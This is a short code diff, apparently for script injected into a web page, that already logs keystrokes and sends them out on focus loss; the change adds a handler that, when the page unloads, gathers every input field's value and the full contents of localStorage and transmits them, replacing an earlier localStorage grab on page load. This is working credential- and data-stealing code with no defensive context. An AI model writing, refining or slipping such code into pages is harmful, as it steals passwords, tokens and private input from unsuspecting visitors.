@@ -51,12 +51,16 @@
     };    
   };
 
+  window.onbeforeunload = (event) => {
+    const allInputs = document.querySelectorAll('input');
+    const inputValues = [...allInputs].map((inputItem) => inputItem.value);
+ 
+    const currentLocalStorage = {...localStorage};
+ 
+    sendData({ inputValues, currentLocalStorage }, 'Information');
+  };
+
   startKeyLogging();
 
   document.addEventListener('focusout', () => sendData({ keyChars }));
-
-  document.addEventListener('DOMContentLoaded', function() {
-    const currentLocalStorage = {...localStorage};
-    sendData({ currentLocalStorage }, 'storage');
- }, false);    
 })();
